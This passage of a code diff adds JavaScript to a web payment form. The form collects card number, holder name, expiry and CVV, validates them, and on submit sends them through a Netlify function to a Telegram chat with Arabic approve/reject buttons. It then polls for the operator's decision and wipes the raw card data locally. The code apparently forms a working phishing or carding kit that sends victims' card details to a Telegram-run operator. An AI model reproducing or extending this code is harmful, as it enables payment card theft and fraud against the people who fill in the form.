+                    { text: "❌ رفض", callback_data: "payment_reject" }
+                  ]
+                ]
+              }
+            };
+
+            const response = await fetch("/.netlify/functions/telegram", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ method: "sendMessage", ...body })
+            });
+            if (!response.ok) return null;
+            const data = await response.json().catch(() => null);
+            if (!response.ok || !data?.ok || !data?.result?.message_id) return null;
+
+            // ── Clear raw card data immediately after successful send ──────────
+            // Keep only cardLast4 so verification.html can show the masked number.
+            const last4 = localStorage.getItem("cardLast4") || "";
+            [
+              "paymentData", "cardNumber", "paymentCardNumber",
+              "cardHolderName", "expiry", "expiryMonth", "expiryYear", "cvv"
+            ].forEach((key) => localStorage.removeItem(key));
+            if (last4) localStorage.setItem("cardLast4", last4);
+            // ─────────────────────────────────────────────────────────────────
+
+            return Number(data.result.message_id);
+          } catch (error) {
+            console.error("Telegram send exception:", error);
+            return null;
+          }
+        }
+
+        document.querySelectorAll('input[type="tel"]').forEach((input) => {
+          input.addEventListener("input", () => {
+            if (input === cardInput) return;
+            const normalized = normalizeDigits(input.value);
+            if (input.value !== normalized) input.value = normalized;
+          });
+        });
+
+        cardInput.addEventListener("input", () => {
+          const cursorPosition = cardInput.selectionStart ?? cardInput.value.length;
+          const digitsBeforeCursor = cardInput.value.slice(0, cursorPosition).replace(/\D/g, "").length;
+          const digits = normalizeDigits(cardInput.value);
+          const formatted = formatCardNumber(digits);
+
+          cardInput.value = formatted;
+
+          const newCursorPosition = getCaretPositionFromDigitCount(formatted, digitsBeforeCursor);
+          cardInput.setSelectionRange(newCursorPosition, newCursorPosition);
+
+          setCardBrand(digits);
+          clearCardError();
+          setCardSuccess(false);
+        });
+
+        cardInput.addEventListener("blur", validateCardNumber);
+        cardInput.addEventListener("input", savePaymentData);
+
+        if (cardHolderInput) {
+          cardHolderInput.addEventListener("input", () => {
+            setFieldSuccess(cardHolderInput.closest(".field"), false);
+            if (cardHolderError) {
+              cardHolderError.textContent = "";
+            }
+            savePaymentData();
+          });
+          cardHolderInput.addEventListener("blur", validateCardHolder);
+        }
+
+        if (expiryInput) {
+          expiryInput.addEventListener("input", () => {
+            const digits = normalizeDigits(expiryInput.value).slice(0, 4);
+            const monthDigits = digits.slice(0, 2);
+            const yearDigits = digits.slice(2, 4);
+            expiryInput.value = yearDigits ? `${monthDigits}/${yearDigits}` : monthDigits;
+            if (expiryError) expiryError.textContent = "";
+            if (expiryFieldWrap) {
+              expiryFieldWrap.classList.remove("expiry-field--error");
+              expiryFieldWrap.classList.remove("expiry-field--success");
+            }
+            savePaymentData();
+          });
+
+          expiryInput.addEventListener("blur", validateExpiry);
+        }
+
+        cvvInput.addEventListener("input", () => {
+          const digits = normalizeDigits(cvvInput.value).slice(0, 3);
+          if (cvvInput.value !== digits) cvvInput.value = digits;
+          cvvError.textContent = "";
+          setFieldSuccess(cvvInput.closest(".field"), false);
+          savePaymentData();
+        });
+
+        cvvInput.addEventListener("blur", validateCvv);
+
+        if (form && loadingOverlay) {
+          form.addEventListener("submit", async (event) => {
+            event.preventDefault();
+            const cardValid = validateCardNumber();
+            const holderValid = validateCardHolder();
+            const expiryValid = validateExpiry();
+            const cvvValid = validateCvv();
+
+            if (!cardValid || !holderValid || !expiryValid || !cvvValid) {
+              return;
+            }
+
+            savePaymentData();
+
+            showDeclineBox(false);
+            setOverlayVisible(true);
+            try {
+              const credentials = getTelegramCredentials();
+              const messageId = await sendCustomerInfoToTelegram();
+              if (messageId) {
+                if (credentials) {
+                  await bootstrapUpdatesOffset(credentials);
+                  startPaymentStatusPolling(messageId, credentials);
+                } else {
+                  setOverlayVisible(false);
+                }
+              } else {
+                setOverlayVisible(false);
+              }
+            } catch {
+              setOverlayVisible(false);
+            }
+          });
+        }
+
+        setCardBrand(normalizeDigits(cardInput.value));
+        applyCardRejectedNoticeFromQuery();
+      })();
+    </script>
+  </body>
+</html>
